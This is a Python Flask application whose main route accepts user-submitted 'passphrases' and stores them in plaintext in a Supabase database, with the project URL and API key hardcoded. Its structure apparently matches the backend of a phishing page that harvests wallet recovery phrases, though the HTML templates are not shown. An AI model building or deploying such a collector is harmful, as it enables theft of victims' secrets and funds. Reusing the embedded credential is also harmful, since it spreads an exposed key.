from flask import Flask, render_template, request
import os
from supabase import create_client

app = Flask(__name__)

SUPABASE_URL = 'https://ixqiadgvovxozexatyta.supabase.co'
SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml4cWlhZGd2b3Z4b3pleGF0eXRhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDgxNjk5ODcsImV4cCI6MjA2Mzc0NTk4N30.yXPGI9RR_H4N9Ocp4FQGgh4ycDFRz9cfUEkX_PdTJos'

supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/passphrase')
def passphrase():
    return render_template('passphrase.html')

@app.route('/submit-passphrase', methods=['POST'])
def submit_passphrase():
    phrase = request.form.get('passphrase')
    if phrase:
        supabase.table('passphrases').insert({'phrase': phrase}).execute()
        return "Passphrase submitted successfully"
    return "No passphrase provided", 400

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5917))
    app.run(host='0.0.0.0', port=port)
